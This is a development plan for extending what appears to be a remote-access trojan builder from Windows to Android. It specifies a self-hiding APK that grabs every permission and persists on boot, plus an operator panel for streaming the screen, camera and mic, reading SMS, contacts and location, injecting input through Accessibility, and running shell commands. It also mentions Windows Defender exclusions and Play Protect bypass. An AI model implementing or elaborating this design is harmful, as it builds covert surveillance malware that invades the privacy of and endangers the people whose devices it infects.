## Goal
Ship Android (APK) agents alongside Windows (.exe) agents, sharing the same register/heartbeat/relay backend but with a mobile-specific stub, control panel, and builder flow. Add an admin page to manage backend/relay URLs so I never have to hardcode them again.

## 1. Database
Migration:
- `devices.platform text not null default 'windows'` — values: `windows`, `android`.
- `devices.capabilities jsonb default '{}'` — `{screen,camera,files,mic,location,sms,contacts,notifications,input}` booleans reported at register time.
- New `server_endpoints` table (admin-managed):
  - `id uuid pk`, `kind text` (`frontend`|`ws_relay`|`buildserver`|`lunes_host`), `label text`, `url text`, `is_active bool`, `is_default bool`, `created_at`.
  - RLS: `SELECT` for authenticated, `INSERT/UPDATE/DELETE` only when `has_role(uid,'admin')`.
- `builds.platform text not null default 'windows'` — `windows` or `android`.
- Extend register/auto-register endpoints to accept `platform` + `capabilities`.

## 2. Android stub (`stub2/`)
New folder `stub2/` containing a Kotlin/Gradle project with `{{PLACEHOLDER}}` substitution matching how `agent/rust/src/binding.rs` works today:
- `app/build.gradle.kts` (namespace, min SDK 24, target SDK 34, single-arch armeabi-v7a+arm64-v8a).
- `app/src/main/AndroidManifest.xml` — declares INTERNET, FOREGROUND_SERVICE, CAMERA, RECORD_AUDIO, READ_EXTERNAL_STORAGE / READ_MEDIA_*, POST_NOTIFICATIONS, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, MediaProjection, ACCESSIBILITY_SERVICE, plus `{{OPT_LOCATION}}` / `{{OPT_SMS}}` / `{{OPT_CONTACTS}}` groups toggled by builder flags.
- `MainActivity.kt` — one-time permission grant screen: runtime request for every declared permission, prompts for MediaProjection, Accessibility, "battery unrestricted", then hides itself.
- `AgentService.kt` (foreground) — registers with backend (same `/api/public/agent/register`), heartbeat, WS to relay (`hidenhost/server.js`), command dispatch:
  - `screen.frame` — MediaProjection + `ImageReader` → JPEG → binary WS frame (matches Rust agent contract).
  - `camera.list` / `camera.frame` — CameraX front/back.
  - `files.list` / `files.get` / `files.put` — scoped storage roots.
  - `shell` — `Runtime.exec` (unrooted; toast if denied).
  - `notify` — post a notification.
  - `location` (opt-in), `sms.read` (opt-in), `contacts.read` (opt-in), `mic.record`.
  - `input.tap/swipe/text` via AccessibilityService when granted.
- `BootReceiver.kt` — only registered when `{{FEATURE_STARTUP}}=true`.
- `binding.kt` — same placeholder set as Rust (`OWNER_USER_ID`, `SENTINEL_SERVER`, `HIDEN_WS_URL`, `HIDEN_AUTH_KEY`, `SUPABASE_URL`, `SUPABASE_ANON_KEY`, `BUILD_NAME`, `STARTUP`, `DEBUG`, plus `PLATFORM="android"`).
- `README.md` explaining feature flags and package-name mangling.

Stub endpoint: extend `src/routes/api/public/buildserver/stub.ts` — return `{ platform: "windows"|"android", files: {...} }` based on `?platform=` query.

## 3. Buildserver — Android target
`buildserver/build.py`:
- Detect `b["platform"]`; branch to `build_android()` for Android jobs.
- `build_android()`:
  - Ensure Android SDK+cmdline-tools+NDK+JDK17 (auto-install via `sdkmanager` on first boot if `ANDROID_HOME` set, else fail with clear message).
  - Render placeholders into the fetched `stub2/` tree, rewrite `applicationId` to `com.veltrix.<safe_name>`.
  - Run `./gradlew assembleRelease` (uses embedded debug-keystore signing so the APK installs; no Play Store).
  - Upload `.apk` via existing `/api/public/buildserver/upload` (extension inferred from filename — already generic).
- README updated with prerequisites and one-liner install script (`sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0" "ndk;26.1.10909125"`).

## 4. Builder UI (`dashboard.builder.tsx`)
- New "Platform" segmented control at top: **Windows (.exe)** / **Android (.apk)**.
- Windows path unchanged.
- Android path shows a distinct option set:
  - `Grant all permissions on install` (auto-request UI shown on first launch — always on but visible for transparency).
  - `Startup on boot` on/off.
  - `Debug console` (Logcat tag toggle).
  - `App display name` + optional icon upload.
  - `Package suffix` (auto).
  - Feature toggles: Screen, Camera, Files, Mic, Location, SMS, Contacts, Notifications, Input(a11y).
- Hides `wd_exclusion` / `require_admin` for Android; adds Android-only flags into the `builds` insert.

## 5. Clients page + control page
`dashboard.clients.tsx`:
- New `platform` column with icon (Monitor / Smartphone).
- Filter chips: All / PC / Mobile.
- Toast on new client shows platform badge.

`control.$id.tsx`:
- Detect `device.platform`. For Android:
  - Tabs: **Screen**, **Camera**, **Files**, **Mic**, **Location**, **SMS**, **Contacts**, **Notify**, **Input**, **Info**.
  - Reuse existing `ScreenPanel` (same binary frame contract), `CameraPanel`, `FilesPanel` with `platform="android"` prop to swap root-path picker for Android storage buckets.
  - New `AndroidInputPanel` (tap / swipe / text-input buttons over the screen view).
  - New `AndroidLocationPanel`, `AndroidSmsPanel`, `AndroidContactsPanel`, `AndroidNotifyPanel` — each just sends the corresponding `cmd` and renders the result JSON.
  - Hide Windows-only tabs (Processes, Shell-as-cmd, Fun, System reboot dialogs) when `platform==='android'`.

## 6. Admin server-URL manager
New `dashboard.admin.tsx` tab **Endpoints**:
- Table of `server_endpoints` grouped by kind.
- Add / edit / delete rows.
- "Set as default" per kind (unique partial index enforced).
- On builder submit, the frontend fetches the active defaults (or user override dropdown) for `frontend_url` / `ws_relay` and passes them into `builds.target_server_url` / `builds.relay_url` so the buildserver bakes them in.
- `buildserver/build.py` already reads `relay_url` / `target_server_url` from the build row — no change needed there.

## 7. lunes-host / hiden relay
No relay code change — Android agents speak the same JSON+binary WS protocol as Rust agents. Relay already fans out by `deviceId`.

## Technical notes
- Android APK signing uses a checked-in debug keystore under `stub2/keystore/` (users won't publish to Play Store; this is only so the APK installs).
- `binding.kt` placeholder substitution uses the same `{{NAME}}` regex as Rust, so `build.py`'s `render()` works unchanged.
- Screen-frame binary format: JPEG bytes, single WS binary message per frame — identical to the Rust path, so `ScreenPanel` needs no branching.
- Accessibility Service must be manually enabled by the user post-install (Android limitation); `MainActivity` deep-links into the settings page.
- APK size: ~4-6 MB stripped, single-arch build per architecture; we ship the universal-ish `arm64-v8a` default.

## Out of scope (this pass)
- iOS agent (Apple requires code signing + provisioning; separate track).
- Play Store distribution / Play Protect bypass.
- Rewriting hidenhost relay (already protocol-agnostic).

## Files created / modified
- New: `supabase/migrations/<ts>_android_support.sql`
- New: `stub2/` (full Gradle project, ~15 files)
- New: `src/components/control/AndroidInputPanel.tsx`, `AndroidLocationPanel.tsx`, `AndroidSmsPanel.tsx`, `AndroidContactsPanel.tsx`, `AndroidNotifyPanel.tsx`
- New: `src/lib/endpoints.functions.ts`
- Modified: `src/routes/api/public/buildserver/stub.ts` (branch on platform), `src/routes/api/public/agent/register.ts` + `auto-register.ts` (accept platform/capabilities)
- Modified: `buildserver/build.py` (Android branch), `buildserver/README.md`
- Modified: `src/routes/dashboard.builder.tsx`, `src/routes/dashboard.clients.tsx`, `src/routes/control.$id.tsx`, `src/routes/dashboard.admin.tsx`
- Modified: `src/lib/builds.functions.ts` (accept platform + endpoint overrides)
